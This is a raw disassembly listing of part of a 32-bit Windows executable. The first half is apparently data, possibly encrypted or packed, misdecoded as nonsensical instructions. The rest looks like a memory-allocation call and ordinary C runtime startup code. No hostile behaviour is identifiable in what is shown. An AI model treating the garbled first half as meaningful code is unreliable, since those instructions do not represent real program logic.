  4225f4:	stos   DWORD PTR es:[edi],eax
  4225f5:	retw   0x8f6e
  4225f9:	pop    esi
  4225fa:	cmp    ecx,DWORD PTR [edi+eax*4]
  4225fd:	das    
  4225fe:	ss hlt 
  422600:	cmp    ah,BYTE PTR ds:0x9963e20b
  422606:	icebp  
  422607:	inc    ebx
  422608:	add    DWORD PTR [eax-0x47f9b447],0x7f
  42260f:	leave  
  422610:	dec    esi
  422611:	pop    ss
  422612:	mov    ebx,0x7b871d23
  422618:	xor    eax,0x44564be9
  42261d:	jno    0x422606
  42261f:	cmp    BYTE PTR [ebx-0x4ac3a3d4],dh
  422625:	add    bh,al
  422627:	inc    ebx
  422628:	add    eax,0x2c1ca7d9
  42262d:	and    cl,dl
  42262f:	lock stc 
  422631:	enter  0xbcb1,0xe7
  422635:	xchg   esp,eax
  422636:	mov    gs,WORD PTR [ecx]
  422638:	lds    edi,FWORD PTR [esi]
  42263a:	dec    esp
  42263b:	or     eax,0xc01aefb5
  422640:	or     DWORD PTR [ebx+0x49],edi
  422643:	push   eax
  422644:	sub    ebp,DWORD PTR [edi-0x29]
  422647:	sub    eax,0xaa1ac6c0
  42264c:	std    
  42264d:	pop    esp
  42264e:	add    BYTE PTR [ecx-0x7a],ch
  422651:	rcl    BYTE PTR [eax+ecx*2-0x72],cl
  422655:	sbb    ecx,DWORD PTR [eax+0xa]
  422658:	mov    dh,0x2f
  42265a:	push   ecx
  42265b:	stos   BYTE PTR es:[edi],al
  42265c:	jmp    0x422638
  42265e:	jbe    0x42264e
  422660:	xchg   esp,eax
  422661:	out    dx,al
  422662:	xchg   ebx,eax
  422663:	call   0xb4dd8887
  422668:	or     BYTE PTR [ecx+0x37],0x66
  42266c:	xor    DWORD PTR ds:0xd76ee977,eax
  422672:	into   
  422673:	pop    ebx
  422674:	mov    esi,0x2a85d260
  422679:	or     eax,0x7931353f
  42267e:	(bad)  
  42267f:	shl    BYTE PTR [eax-0x7],0xc
  422683:	push   0xa30e729c
  422688:	lods   eax,DWORD PTR ds:[esi]
  422689:	pop    esi
  42268a:	inc    ecx
  42268b:	jbe    0x422703
  42268d:	enter  0x4e9c,0xbb
  422691:	push   ss
  422692:	mov    ecx,0x2b7887f2
  422697:	jne    0x4226b4
  422699:	mov    esp,0xf54d666b
  42269e:	mov    dl,0x21
  4226a0:	in     eax,dx
  4226a1:	ins    DWORD PTR es:[edi],dx
  4226a2:	loope  0x422712
  4226a4:	xchg   esp,eax
  4226a5:	enter  0xbbf6,0x4f
  4226a9:	lods   al,BYTE PTR ds:[esi]
  4226aa:	sbb    bl,BYTE PTR [edx]
  4226ac:	cmp    eax,0x78311a4a
  4226b1:	leave  
  4226b2:	aas    
  4226b3:	pop    ds
  4226b4:	cmp    DWORD PTR [eax+ecx*8],ebx
  4226b7:	fild   QWORD PTR ds:0xb80deca7
  4226bd:	jmp    0x1c6ae31e
  4226c2:	mov    ah,0xcf
  4226c4:	dec    edx
  4226c5:	icebp  
  4226c6:	push   0xffffff83
  4226c8:	outs   dx,BYTE PTR ds:[esi]
  4226c9:	jbe    0x422703
  4226cb:	lds    ecx,FWORD PTR [eax-0x5736cc55]
  4226d1:	clc    
  4226d2:	bound  esp,QWORD PTR [edi-0x59b1c155]
  4226d8:	(bad)  
  4226d9:	out    0x7b,eax
  4226db:	fisttp WORD PTR [ebp+0x57fad99f]
  4226e1:	pop    esi
  4226e2:	mov    ?,WORD PTR [ecx+0x1218549b]
  4226e8:	mov    ds:0x789ff1a3,al
  4226ed:	lahf   
  4226ee:	pop    eax
  4226ef:	add    esp,DWORD PTR ds:0xc0ddcced
  4226f5:	gs xchg esp,eax
  4226f7:	mov    BYTE PTR [ebx-0x65],bl
  4226fa:	or     bl,BYTE PTR [ebp+0x27]
  4226fd:	mov    dh,0xb3
  4226ff:	outs   dx,DWORD PTR ds:[esi]
  422700:	mov    DWORD PTR [edi],eax
  422702:	out    0x10,al
  422704:	xchg   ch,bh
  422706:	sbb    ebx,DWORD PTR [eax]
  422708:	mov    edx,0xe45938e0
  42270d:	daa    
  42270e:	jmp    0x1c377dc
  422713:	mov    ah,BYTE PTR [edi+edi*4-0x636a9f5b]
  42271a:	xchg   edx,eax
  42271b:	cwde   
  42271c:	cmp    dh,BYTE PTR [edx+esi*2+0x26]
  422720:	cdq    
  422721:	or     eax,DWORD PTR [esi-0x53]
  422724:	jmp    0x20b:0x24f58b15
  42272b:	mov    cl,0x7c
  42272d:	and    BYTE PTR [ebp-0x5f973478],dh
  422733:	pop    edi
  422734:	cld    
  422735:	es (bad) 
  422737:	rol    edi,1
  422739:	imul   ebx,DWORD PTR [edi-0x3901e1cd],0x65
  422740:	jne    0x4226c8
  422742:	or     eax,0x84f06bc0
  422747:	(bad)  
  422748:	pop    esi
  422749:	iret   
  42274a:	pcmpgtd mm3,QWORD PTR [eax]
  42274d:	popf   
  42274e:	mov    bl,0x88
  422750:	test   DWORD PTR [edi+0x65],0xac5a4a87
  422757:	jmp    DWORD PTR [eax+eax*8+0x3b]
  42275b:	clc    
  42275c:	push   edi
  42275d:	sbb    eax,0x1e1c25b
  422762:	out    dx,al
  422763:	xchg   BYTE PTR ss:[ebp+0x130d3879],dl
  42276a:	xor    al,0x32
  42276c:	mov    ds:0x170a7a22,eax
  422771:	mov    edx,0x2ed44528
  422776:	cli    
  422777:	jmp    0x42278f
  422779:	int3   
  42277a:	mov    WORD PTR [edi+0x5c61781],es
  422780:	(bad)  
  422781:	in     eax,dx
  422782:	leave  
  422783:	out    dx,eax
  422784:	mov    al,ds:0x258cae5c
  422789:	fwait
  42278a:	push   ss
  42278b:	pop    edi
  42278c:	jp     0x422748
  42278e:	fsubrp st(4),st
  422790:	cli    
  422791:	and    cl,dh
  422793:	cdq    
  422794:	inc    ecx
  422795:	cmp    dh,BYTE PTR [ecx]
  422797:	cmp    DWORD PTR [ebp-0x4a],edi
  42279a:	aaa    
  42279b:	stos   DWORD PTR es:[edi],eax
  42279c:	adc    BYTE PTR [ecx+0x41cc9124],0x45
  4227a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227a4:	fwait
  4227a5:	jp     0x94722404
  4227ab:	das    
  4227ac:	scas   eax,DWORD PTR es:[edi]
  4227ad:	mov    BYTE PTR [ebp-0x6405b76e],cl
  4227b3:	jmp    0x968c7c5
  4227b8:	pop    ebx
  4227b9:	adc    ebp,DWORD PTR [ebx+0x71]
  4227bc:	adc    dl,bl
  4227be:	jl     0x422759
  4227c0:	out    dx,eax
  4227c1:	and    dh,BYTE PTR [ecx+edi*4+0x75e08e2a]
  4227c8:	ret    0x1b7e
  4227cb:	imul   ecx,DWORD PTR [ecx+edi*2+0x19],0xffffffe6
  4227d0:	inc    ebp
  4227d1:	pop    edx
  4227d2:	lds    esp,FWORD PTR [ebx-0x4792bdac]
  4227d8:	cmp    ebx,DWORD PTR ds:0xed72d63b
  4227de:	call   0x9b3b:0xb347a93a
  4227e5:	out    dx,al
  4227e6:	outs   dx,BYTE PTR ds:[esi]
  4227e7:	add    bh,BYTE PTR [esi+0x56645069]
  4227ed:	xchg   DWORD PTR [ebx-0x1],eax
  4227f0:	jns    0x42282f
  4227f2:	addr16 arpl di,cx
  4227f5:	test   eax,0xfdbce529
  4227fa:	mov    ds:0xdac26fde,eax
  4227ff:	fild   DWORD PTR [ebp-0x29f2ee22]
  422805:	push   ebx
  422806:	or     BYTE PTR [edx+ebp*1],dl
  422809:	je     0x4227a5
  42280b:	dec    eax
  42280c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42280d:	ret    0xa183
  422810:	nop
  422811:	adc    ch,al
  422813:	es in  al,dx
  422815:	ret    0xfb41
  422818:	add    al,0xf9
  42281a:	lea    esp,[esp+ecx*2]
  42281d:	and    DWORD PTR [eax-0x68e133d0],ebx
  422823:	or     eax,0xda7f9dbd
  422828:	out    0xf2,eax
  42282a:	or     al,0x7a
  42282c:	and    ah,dh
  42282e:	cmp    DWORD PTR [ebp+ebx*8+0x54],ebp
  422832:	dec    ebp
  422833:	add    ecx,DWORD PTR [edx+ebp*8]
  422836:	data16 adc al,0x39
  422839:	xor    eax,0xfffffffe
  42283c:	aad    0x56
  42283e:	inc    esi
  42283f:	nop
  422840:	push   esp
  422841:	pop    edx
  422842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422843:	inc    edx
  422844:	and    ebp,eax
  422846:	loop   0x42286d
  422848:	add    eax,0x67fc4417
  42284d:	test   DWORD PTR [ecx+0x41],ebp
  422850:	repz pop ecx
  422852:	in     al,0x94
  422854:	popa   
  422855:	enter  0x6ef1,0x16
  422859:	cwde   
  42285a:	add    dh,BYTE PTR [edx]
  42285c:	sbb    esp,DWORD PTR ds:0x1dc1b42d
  422862:	es dec esi
  422864:	cli    
  422865:	shl    BYTE PTR [edx+esi*2+0x1c684bc7],cl
  42286c:	test   ah,ch
  42286e:	repz sub al,0x78
  422871:	das    
  422872:	test   eax,0x736667d5
  422877:	dec    esi
  422878:	dec    eax
  422879:	hlt    
  42287a:	in     al,dx
  42287b:	shl    BYTE PTR [eax],0x9b
  42287e:	outs   dx,BYTE PTR ds:[esi]
  42287f:	inc    esi
  422880:	mov    ds:0x4c7f94c3,al
  422885:	xchg   ebx,eax
  422886:	(bad)  
  422887:	cmp    BYTE PTR [esi-0xb3544eb],bh
  42288d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288e:	lods   eax,DWORD PTR ds:[esi]
  42288f:	xchg   ecx,eax
  422890:	fistp  DWORD PTR [ecx]
  422892:	push   edi
  422893:	inc    esi
  422894:	pop    ebp
  422895:	fs sbb DWORD PTR gs:[edi-0x24],esi
  42289a:	lock inc esi
  42289c:	cs pop esp
  42289e:	leave  
  42289f:	in     al,0xd8
  4228a1:	mov    WORD PTR [ecx-0x340e3b31],?
  4228a7:	ret    0x95e0
  4228aa:	out    0xf,al
  4228ac:	xchg   ebp,eax
  4228ad:	cmp    al,0x2
  4228af:	imul   ebp,esi,0xffffff94
  4228b2:	(bad)  
  4228b3:	cwde   
  4228b4:	fidivr DWORD PTR [edi+0x2ec21d9d]
  4228ba:	aas    
  4228bb:	push   0xb2612e6e
  4228c0:	dec    ebp
  4228c1:	gs loope 0x42286a
  4228c4:	push   cs
  4228c5:	dec    edi
  4228c6:	int3   
  4228c7:	and    bh,bh
  4228c9:	aad    0xfb
  4228cb:	sub    BYTE PTR [eax],bl
  4228cd:	cmc    
  4228ce:	push   ds
  4228cf:	push   0x30
  4228d1:	in     al,dx
  4228d2:	or     dl,BYTE PTR [eax+0x76]
  4228d5:	push   esi
  4228d6:	and    bl,bh
  4228d8:	pop    ebx
  4228da:	cmp    eax,0xc2a9bf2
  4228df:	es and eax,0x399f972e
  4228e5:	and    ebx,DWORD PTR [ebx-0x16473564]
  4228eb:	mov    dl,0x4d
  4228ed:	inc    eax
  4228ee:	outs   dx,DWORD PTR ds:[esi]
  4228ef:	call   0x7d98dc77
  4228f4:	cmp    ecx,DWORD PTR ds:0x74046a3b
  4228fa:	test   al,0xbb
  4228fc:	adc    al,0x44
  4228fe:	ins    BYTE PTR es:[edi],dx
  4228ff:	test   al,0xf0
  422901:	adc    dh,dl
  422903:	icebp  
  422904:	clc    
  422905:	mov    eax,ds:0x66bdfaa2
  42290a:	mov    cl,BYTE PTR [eax+0x6374f1ab]
  422910:	loope  0x422965
  422912:	and    esp,DWORD PTR [edi-0x117083e4]
  422918:	jecxz  0x422943
  42291a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42291b:	xor    eax,0x2c0dae33
  422920:	xlat   BYTE PTR ds:[ebx]
  422921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422922:	ror    dh,cl
  422924:	xor    al,0xcc
  422926:	call   0x2acc690a
  42292b:	sahf   
  42292c:	test   eax,0xc20bd439
  422931:	mov    ebp,0x928ad072
  422936:	cwde   
  422937:	imul   edx,DWORD PTR [ebp-0x7dff1e63],0x79
  42293e:	popf   
  42293f:	test   DWORD PTR ds:0xd0109960,eax
  422945:	inc    eax
  422946:	repnz (bad) 
  422948:	ins    DWORD PTR es:[edi],dx
  422949:	xchg   ecx,eax
  42294a:	jae    0x422958
  42294c:	cmp    ecx,DWORD PTR [ebx+ecx*4-0x72bbf8a6]
  422953:	in     al,0x6c
  422955:	iret   
  422956:	shl    bh,cl
  422958:	push   es
  422959:	push   0x73
  42295b:	push   cs
  42295c:	cmp    dl,BYTE PTR [edi+ecx*2+0x2aa883cd]
  422963:	stos   DWORD PTR es:[edi],eax
  422964:	jg     0x422913
  422966:	pusha  
  422967:	pop    edi
  422968:	mov    ah,0x90
  42296a:	pop    ss
  42296b:	fstp   QWORD PTR [eax]
  42296d:	(bad)  
  42296f:	inc    edi
  422970:	mov    esi,0x345f0023
  422975:	pop    esi
  422976:	int    0x77
  422978:	std    
  422979:	int    0xf0
  42297b:	mov    eax,edi
  42297d:	jecxz  0x422954
  42297f:	in     al,dx
  422980:	xor    BYTE PTR [ecx+eiz*8],ch
  422983:	(bad)  
  422984:	ins    BYTE PTR es:[edi],dx
  422985:	xchg   BYTE PTR [ecx+edi*2],cl
  422988:	and    ecx,DWORD PTR [esi-0x684a38b4]
  42298e:	adc    al,0xb1
  422990:	loopne 0x4229a8
  422992:	cmp    ch,BYTE PTR [edx+0x24]
  422995:	or     al,0x15
  422997:	pop    edx
  422998:	into   
  422999:	inc    eax
  42299a:	and    DWORD PTR [edi-0x4e],0x17c3d42a
  4229a1:	inc    ebp
  4229a2:	test   DWORD PTR [ebx-0x72],0xfd749722
  4229a9:	dec    ecx
  4229aa:	mov    DWORD PTR [edx-0x38],ecx
  4229ad:	clc    
  4229ae:	cmc    
  4229af:	shl    DWORD PTR ds:0xad760d51,cl
  4229b5:	ret    0xddbf
  4229b8:	dec    ecx
  4229b9:	shl    DWORD PTR [esi],0x64
  4229bc:	shufps xmm5,XMMWORD PTR [edi-0x6bfa82f0],0xfa
  4229c4:	lock xchg ebp,eax
  4229c6:	or     al,0x75
  4229c8:	and    al,BYTE PTR [eax-0x22]
  4229cb:	and    ebp,eax
  4229cd:	out    dx,eax
  4229ce:	dec    edx
  4229cf:	mov    BYTE PTR [ebp+0x6a87b74a],dh
  4229d5:	add    al,0xf0
  4229d7:	in     eax,dx
  4229d8:	push   0x4
  4229da:	push   0x1000
  4229df:	push   0x4cf
  4229e4:	push   0x1000
  4229e9:	call   DWORD PTR ds:0x42802c
  4229ef:	push   0x0
  4229f1:	call   esi
  4229f3:	xor    eax,eax
  4229f5:	pop    esi
  4229f6:	add    esp,0x10
  4229f9:	ret    0x10
  4229fc:	nop
  4229fd:	nop
  4229fe:	nop
  4229ff:	nop
  422a00:	jmp    DWORD PTR ds:0x428110
  422a06:	cmp    DWORD PTR ds:0x45fb9c,0x1
  422a0d:	jne    0x422a14
  422a0f:	call   0x422f52
  422a14:	push   DWORD PTR [esp+0x4]
  422a18:	call   0x422ddb
  422a1d:	push   0xff
  422a22:	call   DWORD PTR ds:0x45f294
  422a28:	pop    ecx
  422a29:	pop    ecx
  422a2a:	ret    
  422a2b:	cmp    DWORD PTR ds:0x45fb9c,0x1
  422a32:	jne    0x422a39
  422a34:	call   0x422f52
  422a39:	push   DWORD PTR [esp+0x4]
  422a3d:	call   0x422ddb
  422a42:	push   0xff
  422a47:	call   0x422c21
  422a4c:	pop    ecx
  422a4d:	pop    ecx
  422a4e:	ret    
  422a4f:	push   0x60
  422a51:	push   0x428150
  422a56:	call   0x423940
  422a5b:	mov    edi,0x94
  422a60:	mov    eax,edi
  422a62:	call   0x423990
  422a67:	mov    DWORD PTR [ebp-0x18],esp
  422a6a:	mov    esi,esp
  422a6c:	mov    DWORD PTR [esi],edi
  422a6e:	push   esi
  422a6f:	call   DWORD PTR ds:0x42805c
  422a75:	mov    ecx,DWORD PTR [esi+0x10]
  422a78:	mov    DWORD PTR ds:0x45fba4,ecx
  422a7e:	mov    eax,DWORD PTR [esi+0x4]
  422a81:	mov    ds:0x45fbb0,eax
  422a86:	mov    edx,DWORD PTR [esi+0x8]
  422a89:	mov    DWORD PTR ds:0x45fbb4,edx
  422a8f:	mov    esi,DWORD PTR [esi+0xc]
  422a92:	and    esi,0x7fff
  422a98:	mov    DWORD PTR ds:0x45fba8,esi
  422a9e:	cmp    ecx,0x2
  422aa1:	je     0x422aaf
  422aa3:	or     esi,0x8000
  422aa9:	mov    DWORD PTR ds:0x45fba8,esi
  422aaf:	shl    eax,0x8
  422ab2:	add    eax,edx
  422ab4:	mov    ds:0x45fbac,eax
  422ab9:	xor    esi,esi
  422abb:	push   esi
  422abc:	mov    edi,DWORD PTR ds:0x428014
  422ac2:	call   edi
  422ac4:	cmp    WORD PTR [eax],0x5a4d
  422ac9:	jne    0x422aea
  422acb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ace:	add    ecx,eax
  422ad0:	cmp    DWORD PTR [ecx],0x4550
  422ad6:	jne    0x422aea
  422ad8:	movzx  eax,WORD PTR [ecx+0x18]
  422adc:	cmp    eax,0x10b
  422ae1:	je     0x422b02
  422ae3:	cmp    eax,0x20b
  422ae8:	je     0x422aef
  422aea:	mov    DWORD PTR [ebp-0x1c],esi
  422aed:	jmp    0x422b16
  422aef:	cmp    DWORD PTR [ecx+0x84],0xe
  422af6:	jbe    0x422aea
  422af8:	xor    eax,eax
  422afa:	cmp    DWORD PTR [ecx+0xf8],esi
  422b00:	jmp    0x422b10
  422b02:	cmp    DWORD PTR [ecx+0x74],0xe
  422b06:	jbe    0x422aea
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b10:	setne  al
  422b13:	mov    DWORD PTR [ebp-0x1c],eax
  422b16:	push   0x1
  422b18:	call   0x4238ed
  422b1d:	pop    ecx
  422b1e:	test   eax,eax
  422b20:	jne    0x422b2a
  422b22:	push   0x1c
  422b24:	call   0x422a2b
  422b29:	pop    ecx
  422b2a:	call   0x423864
  422b2f:	test   eax,eax
  422b31:	jne    0x422b3b
  422b33:	push   0x10
  422b35:	call   0x422a2b
  422b3a:	pop    ecx
  422b3b:	call   0x42374d
  422b40:	mov    DWORD PTR [ebp-0x4],esi
  422b43:	call   0x42354f
  422b48:	test   eax,eax
  422b4a:	jge    0x422b54
  422b4c:	push   0x1b
  422b4e:	call   0x422a06
  422b53:	pop    ecx
  422b54:	call   DWORD PTR ds:0x42800c
  422b5a:	mov    ds:0x460354,eax
  422b5f:	call   0x42342d
  422b64:	mov    ds:0x45fb94,eax
  422b69:	call   0x42338b
  422b6e:	test   eax,eax
  422b70:	jge    0x422b7a
  422b72:	push   0x8
  422b74:	call   0x422a06
  422b79:	pop    ecx
  422b7a:	call   0x423158
  422b7f:	test   eax,eax
  422b81:	jge    0x422b8b
  422b83:	push   0x9
  422b85:	call   0x422a06
  422b8a:	pop    ecx
  422b8b:	call   0x422c63
  422b90:	mov    DWORD PTR [ebp-0x20],eax
  422b93:	cmp    eax,esi
  422b95:	je     0x422b9e
  422b97:	push   eax
  422b98:	call   0x422a06
  422b9d:	pop    ecx
  422b9e:	mov    DWORD PTR [ebp-0x38],esi
  422ba1:	lea    eax,[ebp-0x64]
  422ba4:	push   eax
  422ba5:	call   DWORD PTR ds:0x428058
  422bab:	call   0x4230ef
  422bb0:	mov    DWORD PTR [ebp-0x68],eax
  422bb3:	test   BYTE PTR [ebp-0x38],0x1
  422bb7:	je     0x422bbf
  422bb9:	movzx  eax,WORD PTR [ebp-0x34]
  422bbd:	jmp    0x422bc2
  422bbf:	push   0xa
  422bc1:	pop    eax
  422bc2:	push   eax
  422bc3:	push   DWORD PTR [ebp-0x68]
  422bc6:	push   esi
  422bc7:	push   esi
  422bc8:	call   edi
  422bca:	push   eax
  422bcb:	call   0x421850
  422bd0:	mov    edi,eax
  422bd2:	mov    DWORD PTR [ebp-0x6c],edi
  422bd5:	cmp    DWORD PTR [ebp-0x1c],esi
  422bd8:	jne    0x422be0
  422bda:	push   edi
  422bdb:	call   0x422d9b
  422be0:	call   0x422dbd
  422be5:	jmp    0x422c12
  422be7:	mov    eax,DWORD PTR [ebp-0x14]
  422bea:	mov    ecx,DWORD PTR [eax]
  422bec:	mov    ecx,DWORD PTR [ecx]
  422bee:	mov    DWORD PTR [ebp-0x70],ecx
  422bf1:	push   eax
  422bf2:	push   ecx
  422bf3:	call   0x422f8b
  422bf8:	pop    ecx
  422bf9:	pop    ecx
  422bfa:	ret    
  422bfb:	mov    esp,DWORD PTR [ebp-0x18]
  422bfe:	mov    edi,DWORD PTR [ebp-0x70]
  422c01:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c05:	jne    0x422c0d
  422c07:	push   edi
  422c08:	call   0x422dac
  422c0d:	call   0x422dcc
  422c12:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c16:	mov    eax,edi
  422c18:	lea    esp,[ebp-0x7c]
  422c1b:	call   0x42397b
  422c20:	ret    
  422c21:	push   0x42816c
  422c26:	call   DWORD PTR ds:0x428014
  422c2c:	test   eax,eax
  422c2e:	je     0x422c46
  422c30:	push   0x42815c
  422c35:	push   eax
  422c36:	call   DWORD PTR ds:0x428010
  422c3c:	test   eax,eax
  422c3e:	je     0x422c46
  422c40:	push   DWORD PTR [esp+0x4]
  422c44:	call   eax
  422c46:	push   DWORD PTR [esp+0x4]
  422c4a:	call   DWORD PTR ds:0x428060
  422c50:	int3   
  422c51:	push   0x8
  422c53:	call   0x423aff
  422c58:	pop    ecx
  422c59:	ret    
  422c5a:	push   0x8
  422c5c:	call   0x423a6b
  422c61:	pop    ecx
  422c62:	ret    
  422c63:	mov    eax,ds:0x460350
  422c68:	test   eax,eax
  422c6a:	je     0x422c6e
  422c6c:	call   eax
  422c6e:	push   esi
  422c6f:	push   edi
  422c70:	mov    ecx,0x42a00c
  422c75:	mov    edi,0x42a018
  422c7a:	xor    eax,eax
  422c7c:	cmp    ecx,edi
  422c7e:	mov    esi,ecx
  422c80:	jae    0x422c99
  422c82:	test   eax,eax
  422c84:	jne    0x422cc5
  422c86:	mov    ecx,DWORD PTR [esi]
  422c88:	test   ecx,ecx
  422c8a:	je     0x422c8e
  422c8c:	call   ecx
  422c8e:	add    esi,0x4
  422c91:	cmp    esi,edi
  422c93:	jb     0x422c82
  422c95:	test   eax,eax
  422c97:	jne    0x422cc5
  422c99:	push   0x423791
  422c9e:	call   0x423c10
  422ca3:	mov    esi,0x42a000
  422ca8:	mov    eax,esi
  422caa:	mov    edi,0x42a008
  422caf:	cmp    eax,edi
  422cb1:	pop    ecx
  422cb2:	jae    0x422cc3
  422cb4:	mov    eax,DWORD PTR [esi]
  422cb6:	test   eax,eax
  422cb8:	je     0x422cbc
  422cba:	call   eax
  422cbc:	add    esi,0x4
  422cbf:	cmp    esi,edi
  422cc1:	jb     0x422cb4
  422cc3:	xor    eax,eax
  422cc5:	pop    edi
  422cc6:	pop    esi
  422cc7:	ret    
  422cc8:	push   ebp
  422cc9:	mov    ebp,esp
  422ccb:	push   esi
  422ccc:	push   edi
  422ccd:	push   0x8
  422ccf:	call   0x423aff
  422cd4:	xor    esi,esi
  422cd6:	inc    esi
  422cd7:	cmp    DWORD PTR ds:0x45fbe4,esi
  422cdd:	pop    ecx
  422cde:	jne    0x422cf0
  422ce0:	push   DWORD PTR [ebp+0x8]
  422ce3:	call   DWORD PTR ds:0x428068
  422ce9:	push   eax
  422cea:	call   DWORD PTR ds:0x428064
  422cf0:	cmp    DWORD PTR [ebp+0xc],0x0
  422cf4:	mov    al,BYTE PTR [ebp+0x10]
  422cf7:	mov    DWORD PTR ds:0x45fbe0,esi
  422cfd:	mov    ds:0x45fbdc,al
  422d02:	jne    0x422d56
  422d04:	mov    ecx,DWORD PTR ds:0x460348
  422d0a:	test   ecx,ecx
  422d0c:	je     0x422d37
  422d0e:	mov    eax,ds:0x460344
  422d13:	sub    eax,0x4
  422d16:	cmp    eax,ecx
  422d18:	jmp    0x422d30
  422d1a:	mov    eax,DWORD PTR [eax]
  422d1c:	test   eax,eax
  422d1e:	je     0x422d22
  422d20:	call   eax
  422d22:	mov    eax,ds:0x460344
  422d27:	sub    eax,0x4
  422d2a:	cmp    eax,DWORD PTR ds:0x460348
  422d30:	mov    ds:0x460344,eax
  422d35:	jae    0x422d1a
  422d37:	mov    eax,0x42a01c
  422d3c:	mov    esi,0x42a020
  422d41:	cmp    eax,esi
  422d43:	mov    edi,eax
  422d45:	jae    0x422d56
  422d47:	mov    eax,DWORD PTR [edi]
  422d49:	test   eax,eax
  422d4b:	je     0x422d4f
  422d4d:	call   eax
  422d4f:	add    edi,0x4
  422d52:	cmp    edi,esi
  422d54:	jb     0x422d47
  422d56:	mov    eax,0x42a024
  422d5b:	mov    esi,0x42a028
  422d60:	cmp    eax,esi
  422d62:	mov    edi,eax
  422d64:	jae    0x422d75
  422d66:	mov    eax,DWORD PTR [edi]
  422d68:	test   eax,eax
  422d6a:	je     0x422d6e
  422d6c:	call   eax
  422d6e:	add    edi,0x4
  422d71:	cmp    edi,esi
  422d73:	jb     0x422d66
  422d75:	cmp    DWORD PTR [ebp+0x10],0x0
  422d79:	pop    edi
  422d7a:	pop    esi
  422d7b:	je     0x422d86
  422d7d:	push   0x8
  422d7f:	call   0x423a6b
  422d84:	jmp    0x422d98
  422d86:	push   DWORD PTR [ebp+0x8]
  422d89:	mov    DWORD PTR ds:0x45fbe4,0x1
  422d93:	call   0x422c21
  422d98:	pop    ecx
  422d99:	pop    ebp
  422d9a:	ret    
  422d9b:	push   0x0
  422d9d:	push   0x0
  422d9f:	push   DWORD PTR [esp+0xc]
  422da3:	call   0x422cc8
  422da8:	add    esp,0xc
  422dab:	ret    
  422dac:	push   0x0
  422dae:	push   0x1
  422db0:	push   DWORD PTR [esp+0xc]
  422db4:	call   0x422cc8
  422db9:	add    esp,0xc
  422dbc:	ret    
  422dbd:	push   0x1
  422dbf:	push   0x0
  422dc1:	push   0x0
  422dc3:	call   0x422cc8
  422dc8:	add    esp,0xc
  422dcb:	ret    
  422dcc:	push   0x1
  422dce:	push   0x1
  422dd0:	push   0x0
  422dd2:	call   0x422cc8
  422dd7:	add    esp,0xc
  422dda:	ret    
  422ddb:	push   ebp
  422ddc:	mov    ebp,esp
  422dde:	sub    esp,0x10c
  422de4:	mov    eax,ds:0x45f510
  422de9:	xor    eax,DWORD PTR [ebp+0x4]
  422dec:	mov    ecx,DWORD PTR [ebp+0x8]
  422def:	push   ebx
  422df0:	push   esi
  422df1:	mov    DWORD PTR [ebp-0x4],eax
  422df4:	xor    edx,edx
  422df6:	push   edi
  422df7:	xor    eax,eax
  422df9:	cmp    ecx,DWORD PTR [eax*8+0x45f2a0]
  422e00:	je     0x422e08
  422e02:	inc    eax
  422e03:	cmp    eax,0x12
  422e06:	jb     0x422df9
  422e08:	mov    esi,eax
  422e0a:	shl    esi,0x3
  422e0d:	cmp    ecx,DWORD PTR [esi+0x45f2a0]
  422e13:	jne    0x422f3c
  422e19:	mov    eax,ds:0x45fb9c
  422e1e:	cmp    eax,0x1
  422e21:	je     0x422f17
  422e27:	cmp    eax,edx
  422e29:	jne    0x422e38
  422e2b:	cmp    DWORD PTR ds:0x45f298,0x1
  422e32:	je     0x422f17
  422e38:	cmp    ecx,0xfc
  422e3e:	je     0x422f3c
  422e44:	push   0x104
  422e49:	lea    eax,[ebp-0x10c]
  422e4f:	push   eax
  422e50:	push   edx
  422e51:	mov    BYTE PTR [ebp-0x8],dl
  422e54:	call   DWORD PTR ds:0x428074
  422e5a:	test   eax,eax
  422e5c:	jne    0x422e71
  422e5e:	lea    eax,[ebp-0x10c]
  422e64:	push   0x4284c4
  422e69:	push   eax
  422e6a:	call   0x423d20
  422e6f:	pop    ecx
  422e70:	pop    ecx
  422e71:	lea    eax,[ebp-0x10c]
  422e77:	push   eax
  422e78:	lea    edi,[ebp-0x10c]
  422e7e:	call   0x423f50
  422e83:	inc    eax
  422e84:	cmp    eax,0x3c
  422e87:	pop    ecx
  422e88:	jbe    0x422eb3
  422e8a:	lea    eax,[ebp-0x10c]
  422e90:	push   eax
  422e91:	call   0x423f50
  422e96:	mov    edi,eax
  422e98:	lea    eax,[ebp-0x10c]
  422e9e:	sub    eax,0x3b
  422ea1:	push   0x3
  422ea3:	add    edi,eax
  422ea5:	push   0x4284c0
  422eaa:	push   edi
  422eab:	call   0x423e20
  422eb0:	add    esp,0x10
  422eb3:	push   edi
  422eb4:	call   0x423f50
  422eb9:	push   DWORD PTR [esi+0x45f2a4]
  422ebf:	mov    ebx,eax
  422ec1:	call   0x423f50
  422ec6:	lea    eax,[ebx+eax*1+0x1c]
  422eca:	pop    ecx
  422ecb:	add    eax,0x3
  422ece:	pop    ecx
  422ecf:	and    eax,0xfffffffc
  422ed2:	call   0x423990
  422ed7:	mov    ebx,esp
  422ed9:	push   0x4284a4
  422ede:	push   ebx
  422edf:	call   0x423d20
  422ee4:	push   edi
  422ee5:	push   ebx
  422ee6:	call   0x423d30
  422eeb:	push   0x4284a0
  422ef0:	push   ebx
  422ef1:	call   0x423d30
  422ef6:	push   DWORD PTR [esi+0x45f2a4]
  422efc:	push   ebx
  422efd:	call   0x423d30
  422f02:	push   0x12010
  422f07:	push   0x428478
  422f0c:	push   ebx
  422f0d:	call   0x423c22
  422f12:	add    esp,0x2c
  422f15:	jmp    0x422f3c
  422f17:	push   edx
  422f18:	lea    eax,[ebp+0x8]
  422f1b:	push   eax
  422f1c:	lea    esi,[esi+0x45f2a4]
  422f22:	push   DWORD PTR [esi]
  422f24:	call   0x423f50
  422f29:	pop    ecx
  422f2a:	push   eax
  422f2b:	push   DWORD PTR [esi]
  422f2d:	push   0xfffffff4
  422f2f:	call   DWORD PTR ds:0x428070
